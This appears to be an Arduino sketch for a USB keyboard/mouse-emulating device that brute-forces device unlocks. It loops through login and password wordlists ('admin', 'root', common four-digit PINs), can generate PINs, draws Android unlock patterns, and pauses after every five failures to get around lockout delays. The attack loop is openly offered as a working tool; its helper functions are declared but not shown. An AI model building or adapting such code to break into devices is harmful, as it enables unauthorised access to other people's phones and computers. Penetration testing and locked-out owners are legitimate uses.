#define USE_LOGIN true
#define LOGIN_IN_FILES false
//#define USE_PASSWORD true
#define PASSWORD_IN_FILES false

//bruteforce only works for PIN code
#define BRUTEFORCE_PASSWORD false
#define BRUTEFORCE_PIN BRUTEFORCE_PASSWORD

#define ANDROID_PATTERN true
#if ANDROID_PATTERN
  #define DELTA_PATTERN 120
#endif

#define CLASSIC_LCD false
//Need LCD16x2.h from https://www.olimex.com/Products/Duino/Shields/SHIELD-LCD16x2/
#define LCD16X2 true
//If you want to use an external button with the LCD16X2 go to hell
#if not LCD16X2
  #define BUTTON false
  #define BUTTON_PIN 8
#else
  #define BUTTON true
#endif

#if CLASSIC_LCD
  #define LCD_RS 15
  #define LCD_E 14
  #define LCD_D4 5
  #define LCD_D5 4
  #define LCD_D6 3
  #define LCD_D7 2
#endif

#if BRUTEFORCE_PIN
  #include <PinBruteForce.h>
  int bruteForceLength = 4;
  PinBruteForce password(bruteForceLength);
#endif

#if LOGIN_IN_FILES or PASSWORD_IN_FILES
  #include <LineByLineReadFiles.h>

  //Ethernet Shield on Uno and SD Shield for Leonardo/Uno use 4
  const int sdCsPin = 4;
  
  #if LOGIN_IN_FILES
    char *loginWordfiles[] = {"login1.txt", "login2.txt"};
    LineByLineReadFiles login(slice{.array = loginWordfiles, .size = sizeof(loginWordfiles) / sizeof(char*)}, sdCsPin);   
  #endif
  #if PASSWORD_IN_FILES
    char *passwordWordfiles[] = {"pass1.txt", "pass2.txt"};
    LineByLineReadFiles password(slice{.array = passwordWordfiles, .size = sizeof(passwordWordfiles) / sizeof(char*)}, sdCsPin);
  #endif
#endif

#if USE_LOGIN and not LOGIN_IN_FILES
  #include <LineByLine.h>
  char *loginWordlist[] = {"admin", "root", "acervoise"};
  LineByLine login(slice{.array = loginWordlist, .size = sizeof(loginWordlist) / sizeof(char*)});
#endif

#if not BRUTEFORCE_PASSWORD and not PASSWORD_IN_FILES
  #include <LineByLine.h>
  //char *passwordWordlist[] = {"lorem", "ipsum", "dolor", "sit", "amet", "1234567812345678", "test", "password", "toto", "tutu" };
  char *passwordWordlist[] = {"3214", "1576", "1478", "2589", "7268", "1236" };
  LineByLine password(slice{.array = passwordWordlist, .size = sizeof(passwordWordlist) / sizeof(char*) });    
#endif

//If there is a try limit (on Android every 5 failed attemp you have to wait 30 sec.), set limit to true and limitTest to the number of attempts before a lock
bool limit = true;
int limitTest = 5;
//If you are using a login and a password, when you try a new login, you may have more time to wait before getting the error message (on Windows)
//The delayNewLogin allows you to add waiting time when trying a new login for the first time (in ms).
int delayNewLogin = 10000;

/*
 * Users: Do not edit code below!
 */

int attempt = 0;

#if not LCD16X2 and not CLASSIC_LCD
  void lcdStart() {}
  void lcdPrint(char*) {}
  void lcdClear() {}
#else
  void lcdStart();
  void lcdPrint(char*);
  void lcdClear();
#endif

void keyboardStart();
//void wait(int);
void typeLetter(char);
void typePassword(char*);
void typeEnter();
void typeReturn();
void typeTab();
#if BUTTON or LCD16X12
  void waitButtonPressed();
  void pauseWithButton();
#endif
#if ANDROID_PATTERN
  void drawPattern(char*);
  void moveWithoutClic(int, int);
#endif
void attack(char*, char*, int);
void initMouse();
void waitFunction();


void setup() {
  delay(500);
  keyboardStart();
  #if CLASSIC_LCD or LCD16X2
    lcdStart();
  #endif
  #if BUTTON
    #if CLASSIC_LCD or LCD16X2
      lcdPrint("Start: button1");
    #endif
    waitButtonPressed();
 #else
    delay(5000);
 #endif
}

void loop(){
  #if ANDROID_PATTERN
    initMouse();
  #endif
  #if USE_LOGIN
  while(login.hasNext()) {
    char* testedLogin = login.next();
    password.init();
    int addDelay = delayNewLogin;
  #endif
    while(password.hasNext()) {
      
      if(limit and attempt == limitTest) {
        waitFunction();
        attempt = 0;
      } else {
        
        char* testedPassword = password.next();
        #if CLASSIC_LCD or LCD16X2
          lcdClear();
          lcdPrint(testedPassword);
        #endif
        #if USE_LOGIN
          attack(testedPassword, testedLogin, addDelay);
        #else
          attack(testedPassword, "", 0);
        #endif
        //free(testedPassword);
        attempt++;
        
      }
      #if USE_LOGIN
        addDelay = 0; 
      }
      //free(testedLogin);
      #endif
    }
  
  #if CLASSIC_LCD or LCD16X2
    lcdClear();
    lcdPrint("Attack ended");
  #endif
  while(1) {}
}


